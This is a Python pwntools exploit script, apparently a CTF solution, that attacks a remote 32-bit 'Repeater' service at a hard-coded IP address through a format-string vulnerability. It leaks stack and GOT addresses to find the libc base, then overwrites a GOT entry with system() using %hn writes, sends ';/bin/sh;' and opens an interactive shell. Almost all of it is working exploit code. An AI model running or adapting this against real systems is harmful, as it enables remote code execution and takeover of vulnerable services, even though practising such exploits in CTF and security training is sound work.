from pwn import *
#context.log_level = 'debug'
from LibcSearcher import LibcSearcher

p = remote('47.108.135.45', 20092)

#get .text
#make sure the format offset

def leakStack():
	for i in range(100):
		payload = "%%%d$p.tmp" % i
		p.sendline(payload)
		stack = p.recvuntil('.tmp')
	#	print i*4, stack.strip().ljust(10)
		p.recvrepeat(0.2)						#sleep, avoid the bad byte

#DynELF to leak address
def leak(addr):
	payload = "%10$s.tmp" + p32(addr)			# 10 = 8 + 2
	p.sendline(payload)
	p.recvuntil('Repeater:')
	ret = p.recvuntil('.tmp')
	leak_addr = ret[:-4:]
	print "addr: ", hex(addr)
	print "leak_addr: ", leak_addr

	retmain = p.recvrepeat(0.2)
	return leak_addr
'''
def leak(addr):
    # leak addr for three times
    num = 0
    while num < 3:
        try:
            print 'leak addr: ' + hex(addr)
            p.recvuntil('Repeater:')
            payload = "%10$sMARK" + p32(addr)
            p.sendline(payload)
            data = p.recvuntil('MARK', drop=True)
            return data
        except Exception:
            num += 1
            continue
    return None
'''
'.aaaa%8$x'
def getbinary(start_addr):
	addr = start_addr
	text_code = ""
	try:
		while True:
			ret = leak(addr)
			text_code += ret
			addr += len(ret)
			if len(ret) == 0:
				addr += 1
				text_code += '\x00'
	except Exception as e:
		print e
	finally:
		f = open('binary', 'w')
		f.write(text_code)
	f.close()

def pwnit():
	printf_got = 0x804A014
	printf_addr = u32(leak(printf_got)[:4])
	read_addr = u32(leak(0x0804A024)[:4])

	print "printf ==> ", hex(printf_addr)
	print "read_addr ==> ", hex(read_addr)
	#libc = ELF('/home/tree/ctf/ctf-writeup/pwn/buu/x86_libc.so.6')
	#libc = LibcSearcher('printf', printf_addr)

	gadgets = [0x3a80c, 0x3a80e, 0x3a812, 0x3a819, 0x5f065, 0x5f066]
	printf_offset = 0x049020
	system_offset = 0x03a940 #gadgets[0] 
	libc_base = printf_addr - printf_offset
	system = system_offset + libc_base

	print "libc_base ==> " , hex(libc_base)
	print "system ==> ", hex(system)

	#cover printf_got to system
	byte1 = system & 0xff
	byte2 = ((system & 0xffff00) >> 8) & 0xffff

	payload = ""
	payload += '%' + str(byte1) + 'c' + '%16$hhn'
	payload += '%' + str(byte2 - byte1) + 'c' + '%17$hn'

	payload = payload.ljust(32, 'a')
	payload += '.'										#align
	payload += p32(0x804A024) + p32(0x804A024+1)		#strlen_got
	payload += '\x00'


	p.send(payload)
	p.recvuntil('Repeater:')
	p.recvuntil('me:')
	p.sendline(";/bin/sh;")


	p.interactive()

if __name__ == '__main__':

	#leakStack()
	#getbinary(0x8048000)
	pwnit()